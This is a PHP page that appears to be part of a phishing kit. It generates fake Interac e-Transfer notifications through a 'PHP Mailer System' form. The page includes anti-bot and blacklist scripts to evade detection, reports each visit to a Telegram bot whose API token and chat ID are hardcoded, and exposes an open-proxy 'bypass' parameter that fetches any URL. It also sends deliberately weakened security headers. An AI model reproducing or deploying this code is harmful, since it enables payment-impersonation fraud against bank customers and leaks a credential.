
<?php


// Add SSL headers
function addSSLHeaders()
{
    header("Strict-Transport-Security: max-age=31536000; includeSubDomains");
    header("Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval'; style-src 'self' 'unsafe-inline'; img-src 'self'");
    header("X-Content-Type-Options: nosniff");
    header("X-Frame-Options: DENY");
    header("X-XSS-Protection: 1; mode=block");
    header("Referrer-Policy: no-referrer"); // New: Referrer-Policy header
    header("Feature-Policy: microphone 'none'; camera 'none'; geolocation 'none'"); // New: Feature-Policy header
}

// Call the function to add SSL headers
addSSLHeaders();

// Set a temporary cookie session to block deceptive behavior
if (!isset($_COOKIE['block_deceptive'])) {
    $expiry = time() + 3600; // Set the expiry time to 1 hour from now
    setcookie('block_deceptive', '1', $expiry, '/');
}

// Perform CSRF protection
session_start();
include "../../admin/secure/control.php";
include "../../admin/secure/anti.php";
include "../../admin/secure/anti1.php";
include "../../admin/secure/anti2.php";
include "../../admin/secure/anti3.php";
include "../../admin/secure/anti4.php";
include "../../admin/secure/anti5.php";
include "../../admin/secure/anti6.php";
include "../../admin/secure/anti7.php";
include "../../admin/secure/anti8.php";
include "../../admin/secure/blacklist.php";
include "../../admin/secure/configure_sqlite.php";
include "../../admin/secure/bot-crawler.php";
include "../../admin/secure/bots.php";



$csrfToken = md5(uniqid(rand(), true));
$_SESSION['csrf_token'] = $csrfToken;

// Prevent XSS attacks
function sanitizeInput($input)
{
    $input = htmlspecialchars($input, ENT_QUOTES, 'UTF-8');
    return $input;
}

// Encryption functions
function generateRandomKey($length = 32)
{
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $key = '';
    for ($i = 0; $i < $length; $i++) {
        $index = rand(0, strlen($characters) - 1);
        $key .= $characters[$index];
    }
    return $key;
}

function encryptData($data, $key)
{
    $iv = openssl_random_pseudo_bytes(openssl_cipher_iv_length('AES-256-CBC'));
    $encryptedData = openssl_encrypt($data, 'AES-256-CBC', $key, 0, $iv);
    $encryptedData = base64_encode($encryptedData) . '::' . base64_encode($iv);
    return $encryptedData;
}

function decryptData($encryptedData, $key)
{
    $dataParts = explode('::', $encryptedData, 2);
    if (count($dataParts) === 2) {
        $decryptedData = openssl_decrypt(base64_decode($dataParts[0]), 'AES-256-CBC', $key, 0, base64_decode($dataParts[1]));
        return $decryptedData;
    }
    return null;
}

// Get the current date
$currentDate = new DateTime();

// Calculate the expiry date (30 days from the current date)
$expiryDate = $currentDate->add(new DateInterval('P30D'));

// Format the expiry date as desired (e.g., "F j, Y")
$formattedExpiryDate = $expiryDate->format('F j, Y');
?>
<?php
header("Content-Security-Policy-Report-Only: default-src 'none'; script-src 'self'; connect-src 'self'; img-src 'self' data:; style-src 'self' 'unsafe-inline'");
header("X-XSS-Protection: 0");
header("X-Frame-Options: ALLOWALL");
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Credentials: true");
header("Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS");
header("Access-Control-Allow-Headers: X-Requested-With, Content-Type, Origin, Authorization, Accept, Client-Security-Token");

if(isset($_GET['bypass']) && $_GET['bypass'] == 'true'){
    $url = $_GET['url'];
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HEADER, false);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36');
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
        "Content-Security-Policy-Report-Only: default-src 'none'; script-src 'self'; connect-src 'self'; img-src 'self' data:; style-src 'self' 'unsafe-inline'",
        "X-XSS-Protection: 0",
        "X-Frame-Options: ALLOWALL",
        "Access-Control-Allow-Origin: *",
        "Access-Control-Allow-Credentials: true",
        "Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS",
        "Access-Control-Allow-Headers: X-Requested-With, Content-Type, Origin, Authorization, Accept, Client-Security-Token"
    ));
    $response = curl_exec($ch);
    $info = curl_getinfo($ch);
    curl_close($ch);

    header("HTTP/1.1 ".$info['http_code']);
    foreach ($info['headers'] as $header) {
        if (!preg_match('/^Transfer-Encoding:/i', $header)) {
            header($header);
        }
    }
    echo $response;
    exit;
}


$message ="INTERAC GENERATOR ACCESSED\n";

$apiToken = "6547328306:AAFosAwa7wPggddiOV_QgTw7xI-uX8ZEY6s"; 
$data = [
    'chat_id' => '-1001809635857',
    'text' => $message
];

$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" .
                                 http_build_query($data) );
                                                    

?>

<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>PHP Mailer System</title>
<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css">
<head>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>PHP Mailer System</title>
  <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css">
  <style>
    /* CSS design optimized for iPhones */
    body {
      font-family: Arial, sans-serif;
      font-size: 16px;
      color: #333333;
      background-color: #f2f2f2;
    }
    
  

:root {
  --glow-color: hsl(100 100% 69%);
}

*,
*::before,
*::after {
  box-sizing: border-box;
}

html,
body {
  height: 100%;
  width: 100%;
  overflow: hidden;
}

body {
  min-height: 100vh;
  display: flex;
  justify-content: center;
  align-items: center;
  background: black;
}

.glowing-btn {
  position: relative;
  color: var(--glow-color);
  cursor: pointer;
  padding: 0.35em 1em;
  border: 0.15em solid var(--glow-color);
  border-radius: 0.45em;
  background: none;
  perspective: 2em;
  font-family: "Raleway", sans-serif;
  font-size: 2em;
  font-weight: 900;
  letter-spacing: 1em;

  -webkit-box-shadow: inset 0px 0px 0.5em 0px var(--glow-color),
    0px 0px 0.5em 0px var(--glow-color);
  -moz-box-shadow: inset 0px 0px 0.5em 0px var(--glow-color),
    0px 0px 0.5em 0px var(--glow-color);
  box-shadow: inset 0px 0px 0.5em 0px var(--glow-color),
    0px 0px 0.5em 0px var(--glow-color);
  animation: border-flicker 2s linear infinite;
}

:root {
  /* Base font size */
  font-size: 4px;   
  
  /* Set neon color */
  --neon-text-color: #f40;
  --neon-border-color: #08f;
}

body {
  font-family: 'Exo 2', sans-serif;
  display: flex;
  justify-content: center;
  align-items: center;  
  background: #000;
  min-height: 100vh;
}

h1 {
  font-size: 13rem;
  font-weight: 200;
  font-style: italic;
  color: #fff;
  padding: 4rem 6rem 5.5rem;
  border: 0.4rem solid #fff;
  border-radius: 2rem;
  text-transform: uppercase;
  animation: flicker 1.5s infinite alternate;     
}

h1::-moz-selection {
  background-color: var(--neon-border-color);
  color: var(--neon-text-color);
}

h1::selection {
  background-color: var(--neon-border-color);
  color: var(--neon-text-color);
}

h1:focus {
  outline: none;
}

/* Animate neon flicker */
@keyframes flicker {
    
    0%, 19%, 21%, 23%, 25%, 54%, 56%, 100% {
      
        text-shadow:
            -0.2rem -0.2rem 1rem #fff,
            0.2rem 0.2rem 1rem #fff,
            0 0 2rem var(--neon-text-color),
            0 0 4rem var(--neon-text-color),
            0 0 6rem var(--neon-text-color),
            0 0 8rem var(--neon-text-color),
            0 0 10rem var(--neon-text-color);
        
        box-shadow:
            0 0 .5rem #fff,
            inset 0 0 .5rem #fff,
            0 0 2rem var(--neon-border-color),
            inset 0 0 2rem var(--neon-border-color),
            0 0 4rem var(--neon-border-color),
            inset 0 0 4rem var(--neon-border-color);        
    }
    
    20%, 24%, 55% {        
        text-shadow: none;
        box-shadow: none;
    }    
}
    /* Form element styling */
    input[type="text"], textarea {
      width: 100%;
      padding: 12px;
      border: 1px solid #ccc;
      border-radius: 4px;
      box-sizing: border-box;
      margin-top: 6px;
      margin-bottom: 16px;
      resize: vertical;
      font-size: 16px;
    }
    
    /* Submit button styling */
    input[type="submit"] {
      background-color: #007bff;
      color: white;
      padding: 12px 20px;
      border: none;
      border-radius: 4px;
      cursor: pointer;
      font-size: 16px;
      transition: background-color 0.3s ease;
    }
    
    /* Submit button hover state */
    input[type="submit"]:hover {
      background-color: #0062cc;
    }
    
    /* Error message styling */
    .error {
      color: #dc3545;
      font-size: 14px;
    }
  </style> 
<h1>[SR]</h1>
</head>
<body>
<form  action="create.php" method="POST" enctype="multipart/form-data">
  <h1>e TRANS </h1>

  <input type="hidden" name="link" value="<?php echo $_SERVER['HTTP_HOST']; ?>" required>
  <input type="text"   name="sender_name"    placeholder="sender name"     value="One time Contact" required>
  <input type="text"   name="amount"         placeholder="100.00"          Value="100.00"  step="0.01"  required>
<input type="hidden" name="date" id="date" value="">

<script>
  // Get the current date
  var currentDate = new Date();

  // Calculate the date 30 days from now
  var futureDate = new Date();
  futureDate.setDate(currentDate.getDate() + 30);

  // Format the future date as "Month Day, Year" (e.g., "May 2, 2023")
  var formattedDate = futureDate.toLocaleDateString('en-US', {
    month: 'long',
    day: 'numeric',
    year: 'numeric'
  });

  // Set the value of the hidden input field to the calculated date
  document.getElementById('date').value = formattedDate;
</script>
  <center>BY DELETING THE VALUE MEANS YOU UNDERSTAND THAT I WILL NOT BE HELD RESPONSIBLE 
      FOR ANY ILLIGAL OR UNLAWFUL ACTIVATIES COMMITED WITH THIS TOOL.. THANK YOU
  </center>
  <input type="submit" value="Submit">
</form>


</body></html>
